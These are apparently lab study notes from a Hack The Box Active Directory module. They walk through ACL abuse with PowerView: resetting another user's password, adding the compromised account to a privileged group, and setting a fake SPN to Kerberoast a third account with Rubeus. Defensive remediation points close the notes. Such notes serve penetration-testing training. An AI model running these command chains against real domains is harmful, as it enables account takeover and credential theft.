# ACL Abuse Tactics

This document outlines tactics for abusing Active Directory Access Control Lists (ACLs) to escalate privileges.

---

## 1. Setup Initial Credentials
If authentication is required for subsequent steps, create a `PSCredential` object to store credentials.

```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD_HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

## 2. Reset Target User Password
If an ACL grants permission to reset a user's password, leverage PowerView to change it.

### Create New Password String
```powershell-session
PS C:\htb> $newPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### Reset Password
```powershell-session
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $newPassword -Credential $Cred -Verbose
```

## 3. Escalate Privileges via Group Membership
Using the compromised account, leverage ACLs to add it to a privileged group.

### Create Credential Object for Compromised User
```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

### Add to Privileged Group
```powershell-session
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

## 4. Lateral Movement / Further Escalation (Fake SPN)
If modification of an account object is permitted, create a fake SPN to enable Kerberoasting.

```powershell-session
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Perform Kerberoasting with Rubeus
```powershell-session
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

---

## 5. Defensive & Remediation Strategy
To defend against ACL-based attacks, implement the following:

*   **Principle of Least Privilege (PoLP):** Audit and restrict object control rights. Ensure users/groups only have the permissions necessary for their role.
*   **Active Directory Auditing:** Enable "Audit Directory Service Changes" to detect suspicious modifications to group memberships, passwords, or object attributes (like SPNs).
*   **Tiered Administration:** Isolate high-privilege accounts from low-privilege environments to reduce exposure.
*   **Regular ACL Reviews:** Use tools like `BloodHound` to identify dangerous attack paths and misconfigured ACLs within your domain.
*   **Monitor Service Principal Names:** Alert on any unauthorized changes to the `servicePrincipalName` attribute.
